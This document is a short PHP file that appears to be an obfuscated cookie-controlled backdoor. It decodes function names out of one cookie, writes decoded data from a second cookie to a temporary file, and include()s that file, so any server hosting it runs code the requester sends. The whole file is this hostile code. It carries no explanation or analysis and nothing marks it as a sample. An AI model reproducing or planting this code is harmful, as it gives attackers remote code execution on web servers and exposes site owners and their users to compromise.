<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[24])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[24][$n];
        if (!$c[24][$n + 1]) {
            if (!$c[24][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[23]() . $p[26];
    if (!$p[29]($k)) {
        $n = $p[6]($k, $p[19]);
        $p[18]($n, $p[9] . $p[7]($p[28]($c[3])));
    }
    include($k);
}